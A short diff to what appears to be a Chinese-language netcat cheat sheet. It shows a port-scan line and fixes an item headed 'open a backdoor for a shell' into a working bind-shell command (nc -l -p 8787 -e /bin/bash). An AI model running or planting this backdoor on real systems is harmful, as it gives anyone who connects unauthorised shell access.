@@ -216,7 +216,7 @@ $ nc -nvv -w2 -z 192.168.x.x 80-445
 
 5. 为Shell开后门
 ```
-$ nc -l -p 8787 /bin/bash
+$ nc -l -p 8787 -e /bin/bash
 ```
 
 ##### 高级用法：
